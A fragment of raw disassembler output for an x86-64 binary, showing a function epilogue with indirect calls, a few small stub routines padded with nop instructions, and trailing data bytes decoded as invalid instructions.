  40dc2c:	48 8d 05 2d 27 01 00 	lea    0x1272d(%rip),%rax        # 0x420360
  40dc33:	48 89 05 3e cb 00 00 	mov    %rax,0xcb3e(%rip)        # 0x41a778
  40dc3a:	48 8d 05 ff 28 01 00 	lea    0x128ff(%rip),%rax        # 0x420540
  40dc41:	48 89 05 68 cb 00 00 	mov    %rax,0xcb68(%rip)        # 0x41a7b0
  40dc48:	48 8b 05 b1 98 00 00 	mov    0x98b1(%rip),%rax        # 0x417500
  40dc4f:	48 89 1d 3a 28 01 00 	mov    %rbx,0x1283a(%rip)        # 0x420490
  40dc56:	48 89 1d 63 28 01 00 	mov    %rbx,0x12863(%rip)        # 0x4204c0
  40dc5d:	48 89 1d 8c 28 01 00 	mov    %rbx,0x1288c(%rip)        # 0x4204f0
  40dc64:	48 89 05 5d cb 00 00 	mov    %rax,0xcb5d(%rip)        # 0x41a7c8
  40dc6b:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  40dc70:	c6 05 39 28 01 00 01 	movb   $0x1,0x12839(%rip)        # 0x4204b0
  40dc77:	48 c7 05 36 28 01 00 	movq   $0x10,0x12836(%rip)        # 0x4204b8
  40dc7e:	10 00 00 00 
  40dc82:	c6 05 57 28 01 00 01 	movb   $0x1,0x12857(%rip)        # 0x4204e0
  40dc89:	48 c7 05 54 28 01 00 	movq   $0x18,0x12854(%rip)        # 0x4204e8
  40dc90:	18 00 00 00 
  40dc94:	48 c7 05 e1 26 01 00 	movq   $0x4,0x126e1(%rip)        # 0x420380
  40dc9b:	04 00 00 00 
  40dc9f:	c6 05 ba 26 01 00 02 	movb   $0x2,0x126ba(%rip)        # 0x420360
  40dca6:	48 c7 05 ef ca 00 00 	movq   $0x8,0xcaef(%rip)        # 0x41a7a0
  40dcad:	08 00 00 00 
  40dcb1:	c6 05 f0 ca 00 00 18 	movb   $0x18,0xcaf0(%rip)        # 0x41a7a8
  40dcb8:	c6 05 ea ca 00 00 02 	movb   $0x2,0xcaea(%rip)        # 0x41a7a9
  40dcbf:	ff d0                	call   *%rax
  40dcc1:	48 8b 05 58 9a 00 00 	mov    0x9a58(%rip),%rax        # 0x417720
  40dcc8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  40dccd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  40dcd2:	e8 05 b3 ff ff       	call   0x408fdc
  40dcd7:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
  40dcdc:	ff d0                	call   *%rax
  40dcde:	31 c0                	xor    %eax,%eax
  40dce0:	48 83 c4 38          	add    $0x38,%rsp
  40dce4:	5b                   	pop    %rbx
  40dce5:	5e                   	pop    %rsi
  40dce6:	5f                   	pop    %rdi
  40dce7:	5d                   	pop    %rbp
  40dce8:	41 5c                	pop    %r12
  40dcea:	41 5d                	pop    %r13
  40dcec:	41 5e                	pop    %r14
  40dcee:	41 5f                	pop    %r15
  40dcf0:	c3                   	ret
  40dcf1:	90                   	nop
  40dcf2:	90                   	nop
  40dcf3:	90                   	nop
  40dcf4:	90                   	nop
  40dcf5:	90                   	nop
  40dcf6:	90                   	nop
  40dcf7:	90                   	nop
  40dcf8:	90                   	nop
  40dcf9:	90                   	nop
  40dcfa:	90                   	nop
  40dcfb:	90                   	nop
  40dcfc:	90                   	nop
  40dcfd:	90                   	nop
  40dcfe:	90                   	nop
  40dcff:	90                   	nop
  40dd00:	48 83 e9 10          	sub    $0x10,%rcx
  40dd04:	e9 fa 5f ff ff       	jmp    0x403d03
  40dd09:	90                   	nop
  40dd0a:	90                   	nop
  40dd0b:	90                   	nop
  40dd0c:	90                   	nop
  40dd0d:	90                   	nop
  40dd0e:	90                   	nop
  40dd0f:	90                   	nop
  40dd10:	48 83 ec 28          	sub    $0x28,%rsp
  40dd14:	ff 15 22 d7 02 00    	call   *0x2d722(%rip)        # 0x43b43c
  40dd1a:	48 8d 15 40 8c 00 00 	lea    0x8c40(%rip),%rdx        # 0x416961
  40dd21:	48 8d 48 60          	lea    0x60(%rax),%rcx
  40dd25:	e8 e8 3a ff ff       	call   0x401812
  40dd2a:	b9 01 00 00 00       	mov    $0x1,%ecx
  40dd2f:	e8 d4 d8 ff ff       	call   0x40b608
  40dd34:	90                   	nop
  40dd35:	90                   	nop
  40dd36:	90                   	nop
  40dd37:	90                   	nop
  40dd38:	90                   	nop
  40dd39:	90                   	nop
  40dd3a:	90                   	nop
  40dd3b:	90                   	nop
  40dd3c:	90                   	nop
  40dd3d:	90                   	nop
  40dd3e:	90                   	nop
  40dd3f:	90                   	nop
  40dd40:	55                   	push   %rbp
  40dd41:	48 89 e5             	mov    %rsp,%rbp
  40dd44:	5d                   	pop    %rbp
  40dd45:	e9 f6 37 ff ff       	jmp    0x401540
  40dd4a:	90                   	nop
  40dd4b:	90                   	nop
  40dd4c:	90                   	nop
  40dd4d:	90                   	nop
  40dd4e:	90                   	nop
  40dd4f:	90                   	nop
  40dd50:	ff                   	(bad)
  40dd51:	ff                   	(bad)
  40dd52:	ff                   	(bad)
  40dd53:	ff                   	(bad)
  40dd54:	ff                   	(bad)
  40dd55:	ff                   	(bad)
  40dd56:	ff                   	(bad)
  40dd57:	ff 40 dd             	incl   -0x23(%rax)
  40dd5a:	40 00 00             	rex add %al,(%rax)
	...
  40dd65:	00 00                	add    %al,(%rax)
  40dd67:	00 ff                	add    %bh,%bh
  40dd69:	ff                   	(bad)
  40dd6a:	ff                   	(bad)
  40dd6b:	ff                   	(bad)
  40dd6c:	ff                   	(bad)
  40dd6d:	ff                   	(bad)
  40dd6e:	ff                   	(bad)
  40dd6f:	ff 00                	incl   (%rax)
  40dd71:	00 00                	add    %al,(%rax)
  40dd73:	00 00                	add    %al,(%rax)
  40dd75:	00 00                	add    %al,(%rax)
	...
